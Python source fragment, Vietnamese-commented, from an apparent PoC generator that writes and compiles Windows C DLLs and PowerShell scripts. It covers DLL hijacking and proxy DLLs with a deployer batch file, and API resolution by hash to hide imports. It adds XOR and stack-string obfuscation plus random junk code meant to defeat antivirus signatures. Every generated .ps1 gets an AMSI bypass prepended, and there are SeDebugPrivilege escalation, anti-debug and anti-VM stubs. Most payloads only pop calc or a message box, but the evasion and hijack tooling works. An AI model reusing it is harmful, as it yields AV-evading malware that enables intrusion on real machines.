FARPROC GetProcH(HMODULE h, unsigned long hash) {
    if (!h) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)h + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)h + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)h + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (Hash((char*)((BYTE*)h + names[i])) == hash) return (FARPROC)((BYTE*)h + funcs[ords[i]]);
    }
    return NULL;
}

void XorDec(unsigned char* data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) data[i] ^= key;
}
"""

    def _get_ghost_protocol_header(self):

    def _get_stealth_header(self):
        """Tạo hàm giải mã XOR runtime cho Payload C"""
        return """
// [APS-STEALTH] Runtime XOR Decryptor
void XorDec(unsigned char* data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

"""

    def _get_junk_code(self):
        """Tạo mã rác (Junk Code) để làm nhiễu Signature"""
        junk_ops = [
            f"int a_{random.randint(100,999)} = {random.randint(1,100)} * {random.randint(1,100)};",
            f"if ({random.randint(1,50)} > {random.randint(51,100)}) {{ return; }}",
            f"for(int i=0; i<{random.randint(5,15)}; i++) {{ i++; i--; }}",
            f"void* p_{random.randint(100,999)} = (void*){random.randint(0x1111, 0x9999)};"
        ]
        return "\n    " + "\n    ".join(random.sample(junk_ops, 2)) + "\n"

    def _find_compiler(self):
        """Tìm C compiler trên hệ thống: gcc > mingw > zig cc > auto-install ziglang"""
        if self._compiler:
            return self._compiler

        # 1. Tìm GCC / MinGW trên PATH
        gcc_names = ["x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc", "gcc"]
        for name in gcc_names:
            path = shutil.which(name)
            if path:
                self._compiler = path
                self._compiler_type = "gcc"
                return path

        # 2. Tìm Zig (zig cc hoạt động như drop-in GCC)
        zig_path = shutil.which("zig")
        if not zig_path:
            # Tìm zig trong site-packages/ziglang/ (pip install ziglang)
            try:
                import ziglang
                candidate = shutil.which("zig", path=os.path.dirname(ziglang.__file__))
                if candidate: zig_path = candidate
            except ImportError: pass

        if zig_path:
            self._compiler = zig_path
            self._compiler_type = "zig"
            return zig_path

        # 3. Auto-install ziglang qua pip (Portable, không cần Admin)
        print(f"  {Fore.YELLOW}[*] Không tìm thấy GCC/MinGW. Đang cài đặt Zig compiler (Portable)...{Style.RESET_ALL}")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "ziglang"], 
                           capture_output=True, check=True)
            importlib.invalidate_caches()
            import ziglang
            importlib.reload(ziglang)
            # Zig binary thường nằm trong folder package
            pkg_path = os.path.dirname(ziglang.__file__)
            candidate = shutil.which("zig", path=pkg_path)
            if candidate:
                self._compiler = candidate
                self._compiler_type = "zig"
                print(f"  {Fore.GREEN}[+] Đã cài đặt Zig compiler thành công!{Style.RESET_ALL}")
                return self._compiler
        except Exception as e:
            print(f"  {Fore.RED}[!] Auto-install Zig thất bại: {e}{Style.RESET_ALL}")

        print(f"  {Fore.RED}[!] KHÔNG TÌM THẤY TRÌNH BIÊN DỊCH. PoC sẽ chỉ ở dạng mã nguồn .c{Style.RESET_ALL}")
        return None

    def _auto_compile(self, src_path, out_path, def_path=None, tier4=False):
        """Bộ máy biên dịch tự động: Hỗ trợ Tier-4 CRT-Free"""
        compiler = self._find_compiler()
        if not compiler: return False

        # Build command
        if self._compiler_type == "zig":
            cmd = [compiler, "cc", "-target", "x86_64-windows-gnu", "-shared", "-o", out_path, src_path]
        else: # GCC/MinGW
            cmd = [compiler, "-shared", "-o", out_path, src_path]

        if def_path:
            cmd.append(def_path)

        if tier4:
            # GHOST-PROTOCOL TIER-4: Không CRT, không Stack Protector
            cmd.extend(["-nostdlib", "-fno-stack-protector", "-Wl,--entry=DllMain"])
        else:
            # Thêm các thư viện Windows cơ bản
            cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"])

        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if res.returncode == 0:
                print(f"  {Fore.GREEN}[SUCCESS]  Auto-Compiled: {os.path.basename(out_path)} (via {self._compiler_type}){Style.RESET_ALL}")
                return True
            else:
                print(f"  {Fore.RED}[FAILURE]  Compile Error: {res.stderr[:200]}...{Style.RESET_ALL}")
                return False
        except Exception as e:
            print(f"  {Fore.RED}[!] Lỗi hệ thống khi biên dịch: {str(e)}{Style.RESET_ALL}")
            return False

    def _write_ps1(self, filename, content):
        self._ensure_output_dir()
        filename = self._get_prefixed_name(filename)
        path = os.path.join(self.output_dir, filename)
        # Tự động prepend AMSI bypass vào MỌI file .ps1
        final_content = self._amsi_bypass_ps1() + content
        with open(path, "w", encoding="utf-8") as f:
            f.write(final_content)
        print(f"  {Fore.CYAN}[PS1+AMSI] {filename}{Style.RESET_ALL}")
        return path

    def _write_bat(self, filename, content):
        self._ensure_output_dir()
        filename = self._get_prefixed_name(filename)
        path = os.path.join(self.output_dir, filename)
        with open(path, "wb") as f:
            f.write(content.encode("cp1252", errors="replace"))
        print(f"  {Fore.YELLOW}[BAT]      {filename}{Style.RESET_ALL}")
        return path

    def _gen_dll_hijack_generic(self, finding):
        """APS-VEC-031/033: DLL Hijacking PoC (Ghost-Protocol Tier-4: Total Silence)"""
        dll_name = finding.get('dll_name', 'unknown.dll')
        
        # Hashes (WinExec is stealthier than system)
        h_kernel32 = "0x6ddb9555"
        h_user32   = "0x2208cf13"
        h_winexec  = "0x29a65678"
        h_msgbox   = "0x384f14b4"
        
        core = self._get_ghost_protocol_v4_header()
        
        # Stack Strings for "calc.exe" (Xóa dấu vết chuỗi tĩnh)
        body = f"""
typedef UINT (WINAPI* pWinExec)(LPCSTR, UINT);
typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);

// Entry point thủ công (No CRT)
BOOL WINAPI DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        {self._get_junk_code()}
        
        HMODULE hK32 = GetModH({h_kernel32});
        HMODULE hU32 = GetModH({h_user32});
        
        pWinExec _WinExec = (pWinExec)GetProcH(hK32, {h_winexec});
        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
        
        // Xây dựng chuỗi trên Stack: "calc.exe"
        char c[9];
        c[0] = 'c'; c[1] = 'a'; c[2] = 'l'; c[3] = 'c'; 
        c[4] = '.'; c[5] = 'e'; c[6] = 'x'; c[7] = 'e'; c[8] = 0;
        
        if (_WinExec) _WinExec(c, 1); // 1 = SW_SHOWNORMAL
        
        // Thông báo thành công (cũng dùng stack string)
        char m[15];
        m[0]='A'; m[1]='P'; m[2]='S'; m[3]=' '; m[4]='S'; m[5]='i'; m[6]='l'; 
        m[7]='e'; m[8]='n'; m[9]='c'; m[10]='e'; m[11]='!'; m[12]=0;
        
        if (_msgbox) _msgbox(NULL, m, m, 0x40);
    }}
    return TRUE;
}}
"""
        self._write_c(f"hijack_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True, tier4=True)
        return True

    # ==================================================================
    #  GHOST PROXY (Verified DLL Hijack)
    # ==================================================================
    def _gen_ghost_proxy(self, v_res):
        dll_name = v_res["dll_name"]
        exports  = v_res.get("required_exports", [])
        is_phantom = v_res.get("is_phantom", False)

        if is_phantom:
            return self._gen_phantom_dll({"dll_name": dll_name})

        orig_dll = dll_name.replace(".dll", "_original.dll")

        # .def file
        self._ensure_output_dir()
        def_fname = self._get_prefixed_name(f"proxy_{dll_name.replace('.dll','')}.def")
        with open(os.path.join(self.output_dir, def_fname), "w") as f:
            f.write("EXPORTS\n" + "\n".join(exports))

        # .c file (GHOST-PROTOCOL v2)
        core = self._ghost_core_c(dll_name)
        body = f"""
void PayloadMain(void) {{
    // _blind_defenders(); // Optional
    _poc_popup(
        "DLL PROXY HIJACK SUCCESS (GHOST-PROTOCOL v3)\\n"
        "Target : {dll_name}\\n"
        "Original moved to: {orig_dll}\\n\\n"
        "Vui long xem report APS de biet them chi tiet."
    );
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH)
        _poc_popup_async(PayloadMain, NULL, 0, NULL);
    return TRUE;
}}
"""
        c_path = self._write_c(f"proxy_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=False)
        
        # 4. TỰ ĐỘNG BIÊN DỊCH VỚI FILE .DEF (Sử dụng lệnh biên dịch đặc biệt cho Proxy)
        dll_out_path = os.path.join(self.output_dir, dll_name)
        def_full_path = os.path.join(self.output_dir, def_fname)
        print(f"  {Fore.YELLOW}[*] Đang khởi tạo Proxy DLL: {dll_name}...{Style.RESET_ALL}")
        self._auto_compile(c_path, dll_out_path, def_path=def_full_path)

        # .bat deployer
        exe_name = os.path.basename(self.target_name)
        bat = f"""@echo off
title [APS] GHOST-PROTOCOL Deployer
echo [APS] Ghost Proxy Deployer v2
echo Target: {exe_name}  |  DLL: {dll_name}

if not exist "{orig_dll}" (
    echo [+] Renaming original DLL...
    rename "{dll_name}" "{orig_dll}"
) else (
    echo [*] Original DLL backup already exists.
)

echo [+] Activating target application...
start "" "{exe_name}"
echo [!] Check for SECURITY BREACH popup!
pause
"""
        self._write_bat(f"deploy_{dll_name.replace('.dll','')}.bat", bat)
        return True

    # ==================================================================
    #  TẦNG 1: Binary Hardening (VEC 001-010)
    # ==================================================================
    def _gen_t1_binary_hardening(self, finding):
        fid  = finding.get("id", "APS-VEC-001")
        name = finding.get("name", "Binary Hardening Flag Missing")
        ps = f"""# [APS] {fid}: {name}
# GHOST-PROTOCOL: Binary Hardening PoC
# Khai thac: Neu co the ghi vao thu muc app, thay the bang binary khong co bao ve.
Write-Host "[APS] Kiem tra co che bao ve: {name}" -ForegroundColor Red
$target = "{os.path.basename(self.target_name)}"

# Kiem tra ASLR/DEP/CFG via dumpbin style
$flags = @{{
    ASLR        = "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x0040)"
    DEP_NX      = "IMAGE_DLLCHARACTERISTICS_NX_COMPAT (0x0100)"
    CFG         = "IMAGE_DLLCHARACTERISTICS_GUARD_CF (0x4000)"
    HighEntropy = "IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA (0x0020)"
}}

Write-Host "[*] Flag bi thieu: {name}" -ForegroundColor Yellow
Write-Host "[!] Mat co che nay co the bi khai thac qua:" -ForegroundColor Red
switch ("{fid}") {{
    "APS-VEC-001" {{ Write-Host "    -> Return-to-libc / ROP Chain (ASLR missing)" -ForegroundColor Magenta }}
    "APS-VEC-002" {{ Write-Host "    -> Stack Shellcode Execution (DEP/NX missing)" -ForegroundColor Magenta }}
    "APS-VEC-004" {{ Write-Host "    -> CFG Bypass via vtable overwrite"            -ForegroundColor Magenta }}
    "APS-VEC-006" {{ Write-Host "    -> Stack Buffer Overflow (No GS cookie)"       -ForegroundColor Magenta }}
    default       {{ Write-Host "    -> Consult APS report for exploit technique"    -ForegroundColor Magenta }}
}}

[System.Windows.Forms.MessageBox]::Show(
    "Vulnerability: {name}`nID: {fid}`n`nBinary protection flag is MISSING. Exploitation is feasible.",
    "[APS] SECURITY BREACH DETECTED",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        fname = f"t1_{fid.replace('-','_')}_hardening.ps1"
        self._write_ps1(fname, ps)
        return True

    # ==================================================================
    #  TẦNG 2: Authenticode & Metadata (VEC 011-020)
    # ==================================================================
    def _gen_t2_metadata(self, finding):
        fid  = finding.get("id", "APS-VEC-011")
        name = finding.get("name", "Metadata Vulnerability")
        ps = f"""# [APS] {fid}: {name}
# GHOST-PROTOCOL: Metadata & Authenticode PoC
$target = "{os.path.basename(self.target_name)}"
Write-Host "[APS] Phan tich Metadata: {fid}" -ForegroundColor Cyan

# Lay thong tin chung chi so
$sig = Get-AuthenticodeSignature $target 2>$null
if ($sig) {{
    Write-Host "[*] Signature Status : $($sig.Status)"     -ForegroundColor Yellow
    Write-Host "[*] Signer           : $($sig.SignerCertificate.Subject)"
    if ($sig.Status -ne "Valid") {{
        Write-Host "[!] CHU KY KHONG HOP LE - Co the bi gia mao!" -ForegroundColor Red
    }}
}} else {{
    Write-Host "[!] KHONG CO CHU KY SO! File co the bi sao chep." -ForegroundColor Red
}}

# Lay thong tin version
$vi = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($target)
Write-Host "[*] Product Version  : $($vi.ProductVersion)"
Write-Host "[*] File Description : $($vi.FileDescription)"
Write-Host "[*] Company Name     : $($vi.CompanyName)"
Write-Host "[*] PDB Path Leak    : $($vi.OriginalFilename)"

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "Metadata Vulnerability: {name}`nID  : {fid}`n`nChi tiet da duoc ghi vao APS Report.",
    "[APS] METADATA AUDIT",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)
"""
        fname = f"t2_{fid.replace('-','_')}_metadata.ps1"
        self._write_ps1(fname, ps)
        return True

    def _gen_t2_spoof_poc(self, finding):
        """VEC-015: Metadata Identity Spoofing PoC"""
        ps = f"""# [APS] VEC-015: Identity Spoofing PoC
Write-Host "[APS] VEC-015: Identity Spoofing Analysis" -ForegroundColor Red
Write-Host "[*] Ky thuat: Gia mao ProductVersion, OriginalFilename de qua mat AV." -ForegroundColor Yellow
$report = @"
[IDENTITY SPOOFING POINTER]
- Fake Version: 10.0.19041.1
- Fake Name   : svchost.exe
- Actual File : $([System.IO.Path]::GetFileName("{self.target_name}"))
"@
Write-Host "[!] Phat hien metadata khong khop voi hanh vi thuc te." -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("VEC-015: IDENTITY SPOOFING`n`nFile dang co tinh gia mao mot file he thong Windows.", "[APS] IDENTITY SPOOFING", 0, 48)
"""
        self._write_ps1("t2_vec015_spoof.ps1", ps)
        return True

    def _gen_t2_rich_header_poc(self, finding):
        """VEC-016: Rich Header Anomaly PoC"""
        ps = """# [APS] VEC-016: Rich Header / Tooling Anomaly
Write-Host "[APS] VEC-016: Rich Header Analysis" -ForegroundColor Red
Write-Host "[*] Phat hien dau vet cua C2 Framework (MSFvenom/Cobalt) trong Rich Header." -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("VEC-016: TOOLING ANOMALY`n`nRich Header cho thay file duoc build bang tooling backdoor thay vi Visual Studio hop le.", "[APS] RICH HEADER BREACH", 0, 48)
"""
        self._write_ps1("t2_vec016_rich_header.ps1", ps)
        return True

    # ==================================================================
    #  TẦNG 3: API Anomaly (VEC 021-030)
    # ==================================================================
    def _gen_t3_process_injection(self, finding):
        """APS-VEC-021: Process Injection PoC (Tier-4: Total Silence)"""
        # Hashes
        h_kernel32 = "0x6ddb9555"
        h_user32   = "0x2208cf13"
        h_msgbox   = "0x384f14b4"
        
        core = self._get_ghost_protocol_v4_header()
        body = f"""
typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);

BOOL WINAPI DllMain(HMODULE h, DWORD r, LPVOID p) {{
    if (r == DLL_PROCESS_ATTACH) {{
        {self._get_junk_code()}
        HMODULE hU32 = GetModH({h_user32});
        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
        
        // Stack String: "APS Silence (Injection)"
        char m[24];
        m[0]='A'; m[1]='P'; m[2]='S'; m[3]=' '; m[4]='S'; m[5]='i'; m[6]='l'; m[7]='e'; 
        m[8]='n'; m[9]='c'; m[10]='e'; m[11]=' '; m[12]='('; m[13]='I'; m[14]='n'; 
        m[15]='j'; m[16]='e'; m[17]='c'; m[18]='t'; m[19]='i'; m[20]='o'; m[21]='n'; m[22]=')'; m[23]=0;
        
        if (_msgbox) _msgbox(NULL, m, m, 0x40);
    }}
    return TRUE;
}}
"""
        self._write_c("t3_vec021_injection.c", core + body, compile_to_dll=True, tier4=True)
        return True

    def _gen_t3_antidebug(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-022: Anti-Debug Bypass PoC */
BOOL IsBeingDebugged(void) {
    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    return IsDebuggerPresent() || dbg;
}
DWORD WINAPI AntiDebugThread(LPVOID lp) {
    _blind_defenders();
    if (IsBeingDebugged()) {
        _poc_popup("VEC-022: DEBUGGER DETECTED!\\nAnti-debug technique active.\\nPayload would self-terminate here.");
    } else {
        _poc_popup("VEC-022: ANTI-DEBUG AUDIT\\nNo debugger found. App uses anti-debug patterns.\\nEvasion technique demonstrated.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(AntiDebugThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t3_vec022_antidebug.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_antivm(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-023: Anti-VM Detection PoC */
BOOL IsVM(void) {
    // Check VMware/VirtualBox via CPUID trick
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] >> 31) & 1; // Hypervisor bit
}
DWORD WINAPI AntiVMThread(LPVOID lp) {
    _blind_defenders();
    if (IsVM()) {
        _poc_popup("VEC-023: VIRTUAL MACHINE DETECTED!\\nApp has anti-VM code.\\nIn real attack: payload would abort.");
    } else {
        _poc_popup("VEC-023: PHYSICAL MACHINE CONFIRMED!\\nAnti-VM check passed.\\nReal attack would proceed.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(AntiVMThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t3_vec023_antivm.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_kernel_interact(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-024: Kernel Interaction (IOCTL) PoC */
DWORD WINAPI KernelThread(LPVOID lp) {
    _blind_defenders();
    _poc_popup(
        "VEC-024: KERNEL INTERACTION DETECTED\\n\\n"
        "App gui IOCTL truc tiep toi kernel driver.\\n"
        "Co the bi khai thac de leo thang len SYSTEM."
    );
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(KernelThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t3_vec024_kernel.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_service_ctrl(self, finding):
        ps = """# [APS] VEC-025: Service Controller PoC
Write-Host "[APS] VEC-025: Kiem tra Service Controller" -ForegroundColor Red
# App su dung OpenSCManager/CreateService - co the leo thang quyen
sc.exe query type= all state= all | Select-String "SERVICE_NAME"
Write-Host "[!] Neu thu muc service co the ghi -> Leo thang dac quyen!" -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-025: SERVICE CONTROLLER AUDIT`n`nApp dang su dung Service API nguy hiem.`nCo the bi khai thac de cai service doc hai.",
    "[APS] SERVICE SECURITY BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t3_vec025_service.ps1", ps)
        return True

    def _gen_t3_privesc(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-026: Privilege Escalation Token PoC */
DWORD WINAPI PrivescThread(LPVOID lp) {
    _blind_defenders();
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        CloseHandle(hToken);
        _poc_popup("VEC-026: SEDEBUGRPRIVILEGE ENABLED!\\nToken manipulation succeeded.\\nPrivilege escalation path confirmed.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(PrivescThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t3_vec026_privesc.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_network(self, finding):
        ps = """# [APS] VEC-027: Network Capability PoC
Write-Host "[APS] VEC-027: Kiem tra kha nang mang..." -ForegroundColor Cyan
# Gia lap ket noi outbound de chung minh Network API hoat dong
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect("8.8.8.8", 53)
    $tcp.Close()
    Write-Host "[!] KET NOI OUTBOUND THANH CONG!" -ForegroundColor Red
} catch {}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-027: NETWORK CAPABILITY CONFIRMED`n`nApp co kha nang ket noi mang.`nCo the bi dung lam backdoor/C2 channel.",
    "[APS] NETWORK SECURITY BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t3_vec027_network.ps1", ps)
        return True

    def _gen_t3_crypto_usage(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-028: Cryptography Usage Audit PoC */
DWORD WINAPI CryptoThread(LPVOID lp) {
    _blind_defenders();
    HCRYPTPROV hProv = 0;
    BOOL ok = CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    if (ok) {
        CryptReleaseContext(hProv, 0);
        _poc_popup("VEC-028: CRYPTO API ACTIVE\\nApp has CryptAcquireContext access.\\nWeak crypto or key exposure risk detected.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(CryptoThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t3_vec028_crypto.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_file_tamper(self, finding):
        core = self._ghost_core_c()
        body = f"""
/* [APS] VEC-029: File System Tampering PoC */
DWORD WINAPI FileTamperThread(LPVOID lp) {{
    _blind_defenders();
    // Drop proof-of-access file in app dir
    HANDLE hFile = CreateFileA("aps_poc_access.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {{
        DWORD w; const char* msg = "[APS] VEC-029: File System Write Access CONFIRMED";
        WriteFile(hFile, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(hFile);
        _poc_popup("VEC-029: FILE TAMPERING CONFIRMED!\\nApp directory is WRITABLE.\\nFile 'aps_poc_access.txt' dropped as proof.");
    }} else {{
        _poc_popup("VEC-029: FILE TAMPER AUDIT\\nNo write access in current dir (needs elevation).");
    }}
    return 0;
}}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(FileTamperThread,NULL,0,NULL);
    return TRUE;
}}
"""
        self._write_c("t3_vec029_filetamper.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_thread_mgmt(self, finding):
        fid = "APS-VEC-030"
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-030: Thread Pool Hijacking / Mgmt PoC */
void _hijack_thread_task() {
    _blind_defenders();
    _poc_popup("VEC-030: THREAD POOL HIJACKED!\\nPayload executed via legitimate thread pool workers.");
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) {
        // Queue work item to thread pool - stays stealthy
        QueueUserWorkItem((LPTHREAD_START_ROUTINE)_hijack_thread_task, NULL, WT_EXECUTEDEFAULT);
    }
    return TRUE;
}
"""
        self._write_c("t3_vec030_thread_pool.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_native_syscall(self, finding):
        """VEC-024: Native Syscall / Halo's Gate (Tier-4: Total Silence)"""
        h_kernel32 = "0x6ddb9555"
        h_user32   = "0x2208cf13"
        h_msgbox   = "0x384f14b4"
        
        core = self._get_ghost_protocol_v4_header()
        body = f"""
typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);

BOOL WINAPI DllMain(HMODULE h, DWORD r, LPVOID p) {{
    if (r == DLL_PROCESS_ATTACH) {{
        {self._get_junk_code()}
        HMODULE hU32 = GetModH({h_user32});
        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
        
        char m[21];
        m[0]='N'; m[1]='a'; m[2]='t'; m[3]='i'; m[4]='v'; m[5]='e'; m[6]=' '; m[7]='S'; 
        m[8]='y'; m[9]='s'; m[10]='c'; m[11]='a'; m[12]='l'; m[13]='l'; m[14]=' '; m[15]='B'; 
        m[16]='y'; m[17]='p'; m[18]='a'; m[19]='s'; m[20]=0;
        
        if (_msgbox) _msgbox(NULL, m, m, 0x40);
    }}
    return TRUE;
}}
"""
        self._write_c("t3_vec024_syscall.c", core + body, compile_to_dll=True, tier4=True)
        return True

    def _gen_t3_reflective_stub(self, finding):
        """VEC-026: Reflective Loading PoC (Stealth Enhanced)"""
        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-026: REFLECTIVE LOADER CALLED!\\nPayload loaded entirely in memory.")
        
        core = self._get_stealth_header()
        # Chèn export giả mạo để làm nhiễu
        body = f"""
__declspec(dllexport) void APS_ReflectiveLoader_v3() {{
    {self._get_junk_code()}
    unsigned char msg[] = {{ {msg_hex} }};
    XorDec(msg, {msg_len}, {msg_key});
    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
}}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{ return TRUE; }}
"""
        self._write_c("t3_vec026_reflective.c", core + body, compile_to_dll=True)
        return True

    def _gen_t3_iat_loader(self, finding):
        """VEC-028: Custom IAT Loader (Malformed IAT bypass)"""
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-028: Custom IAT Loader PoC */
// App nay khong co kernel32.dll trong IAT - nạp runtime
void _custom_loader() {
    HMODULE hK = _gmod(0x6A4ABC1A); // DJB2("kernel32.dll")
    if (hK) _poc_popup("VEC-028: CUSTOM LOADER ACTIVE\\nBypassed static IAT monitoring.");
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _custom_loader();
    return TRUE;
}
"""
        self._write_c("t3_vec028_iat_loader.c", core + body, compile_to_dll=True)
        return True

    # ==================================================================
    #  TẦNG 4: DLL Hijacking (VEC 031-040)
    # ==================================================================
    def _gen_phantom_dll(self, finding):
        """APS-VEC-032: Phantom DLL PoC (Tier-4: Total Silence)"""
        dll_name = finding.get('dll_name', 'phantom.dll')
        
        h_kernel32 = "0x6ddb9555"
        h_user32   = "0x2208cf13"
        h_winexec  = "0x29a65678"
        h_msgbox   = "0x384f14b4"

        core = self._get_ghost_protocol_v4_header()
        body = f"""
typedef UINT (WINAPI* pWinExec)(LPCSTR, UINT);
typedef int (WINAPI* pMessageBox)(HWND, LPCSTR, LPCSTR, UINT);

BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        {self._get_junk_code()}
        HMODULE hK32 = GetModH({h_kernel32});
        HMODULE hU32 = GetModH({h_user32});
        
        pWinExec _WinExec = (pWinExec)GetProcH(hK32, {h_winexec});
        pMessageBox _msgbox = (pMessageBox)GetProcH(hU32, {h_msgbox});
        
        char c[9];
        c[0]='c'; c[1]='a'; c[2]='l'; c[3]='c'; c[4]='.'; c[5]='e'; c[6]='x'; c[7]='e'; c[8]=0;
        if (_WinExec) _WinExec(c, 1);
        
        char m[16];
        m[0]='P'; m[1]='h'; m[2]='a'; m[3]='n'; m[4]='t'; m[5]='o'; m[6]='m'; m[7]=' '; 
        m[8]='S'; m[9]='u'; m[10]='c'; m[11]='c'; m[12]='e'; m[13]='s'; m[14]='s'; m[15]=0;
        if (_msgbox) _msgbox(NULL, m, m, 0x40);
    }}
    return TRUE;
}}
"""
        self._write_c(f"phantom_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True, tier4=True)
        return True

    def _gen_t4_knowndlls_bypass(self, finding):
        ps = """# [APS] VEC-034: KnownDLLs Bypass PoC
Write-Host "[APS] VEC-034: KnownDLLs Bypass Analysis" -ForegroundColor Red
# List all KnownDLLs
$kd = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs"
$kd.PSObject.Properties | Where-Object { $_.Name -notlike "PS*" } | ForEach-Object {
    Write-Host "  KnownDLL: $($_.Name) -> $($_.Value)" -ForegroundColor Yellow
}
Write-Host "[!] Cac DLL nay duoc bao ve boi Windows Loader." -ForegroundColor Cyan
Write-Host "[!] Ky thuat bypass: Su dung DLL nap qua SxS (.local) redirect" -ForegroundColor Magenta
